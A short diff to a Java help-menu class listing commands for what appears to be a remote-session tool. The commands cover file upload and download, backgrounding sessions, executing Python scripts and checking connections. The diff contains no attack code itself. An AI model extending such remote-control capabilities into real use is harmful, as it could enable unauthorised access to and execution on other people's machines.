@@ -10,9 +10,12 @@ public class Help {
         System.out.println("/upload SOURCE_FILE DESTINATION_FILE - upload a file (slow - cmd; fast - powershell)");
         System.out.println("/background - hide a current session");
         System.out.println("/test - test");
-        System.out.println("/loadModules - load tools, which helps in interaction with windows");
+        //System.out.println("/loadModules - load tools, which helps in interaction with windows");
         System.out.println("/help - show commands");
+        System.out.println("/executeScript FILE - execute python file ");
+        System.out.println("/exit");
+        System.out.println("/testConnections - find inactive connections");
 
-        System.out.println("start download.bat SOURCE_ADDRESS FILENAME - download file (fast)");
+        //System.out.println("start download.bat SOURCE_ADDRESS FILENAME - download file (fast)");
     }
 }
